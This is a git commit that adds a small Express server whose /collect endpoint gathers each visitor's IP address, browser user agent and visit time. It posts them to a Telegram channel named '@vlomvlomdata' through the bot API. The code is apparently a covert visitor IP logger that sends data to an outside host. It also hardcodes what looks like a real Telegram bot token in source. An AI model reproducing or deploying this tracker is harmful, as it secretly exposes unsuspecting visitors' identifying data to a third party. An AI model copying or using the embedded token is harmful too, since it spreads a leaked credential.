45845585e6f51f61af6f42f902b56221b7dec848
Mak <mmtakk264@gmail.com>
2025-03-30 23:44:26 +0200

    Initial commit

---
+++ server.js
@@ -0,0 +1,25 @@
+const express = require('express');
+const axios = require('axios');
+const app = express();
+
+const TOKEN = '7962767337:AAG1w_PlojpJ8GCkTKIPvinNiGomB6gqQEo'; // Токен бота
+const CHANNEL = '@vlomvlomdata'; // Название канала с @
+
+app.use(express.json());
+app.use(express.static('public'));
+
+app.post('/collect', (req, res) => {
+    const data = req.body;
+    const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket.remoteAddress;
+    const text = `Зашёл Юзер:\n- IP: ${ip}\n- Браузер: ${data.userAgent}\n- Время: ${data.time}`;
+
+    axios.post(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        chat_id: CHANNEL,
+        text: text
+    })
+    .then(() => res.send('Ушло'))
+    .catch(() => res.send('Пиздец, ошибка'));
+});
+
+const port = process.env.PORT || 3000;
+app.listen(port, () => console.log(`Пашет на порту ${port}`));
